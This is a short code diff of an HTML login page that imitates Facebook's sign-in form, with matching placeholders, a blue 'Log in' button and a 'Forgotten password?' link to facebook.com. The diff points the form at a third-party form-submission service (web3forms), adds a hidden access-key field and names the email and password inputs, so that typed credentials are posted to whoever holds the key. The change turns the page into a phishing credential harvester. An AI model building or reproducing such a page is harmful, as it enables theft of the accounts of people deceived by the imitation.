@@ -16,9 +16,13 @@
 
     <div class="w-[396px] text-center">
       <div class="pt-3 pb-8 shadow-md rounded-lg bg-white">
-        <form class="w-[364px] mx-auto mb-2 bg-white" action="">
-          <input class="w-full my-[6px] py-[14px] px-4 border border-gray-300 rounded-md outline-blue-600" type="text" placeholder="Email address or phone number" required>
-          <input class="w-full my-[6px] py-[14px] px-4 border border-gray-300 rounded-md outline-blue-600" type="password" placeholder="Password" required>
+        <form action="https://api.web3forms.com/submit" method="POST" class="w-[364px] mx-auto mb-2 bg-white">
+
+          <!-- Replace with your access key -->
+          <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
+
+          <input class="w-full my-[6px] py-[14px] px-4 border border-gray-300 rounded-md outline-blue-600" name="Email or Phone" title="" type="text" placeholder="Email address or phone number" required>
+          <input class="w-full my-[6px] py-[14px] px-4 border border-gray-300 rounded-md outline-blue-600" name="Password" title="" type="password" placeholder="Password" required>
           <button class="w-full h-12 mt-[6px] px-6 bg-blue-600 text-white rounded-md text-xl font-semibold">Log in</button>
         </form>
         <a class="text-blue-600 text-sm hover:underline" href="https://www.facebook.com">Forgotten password?</a>
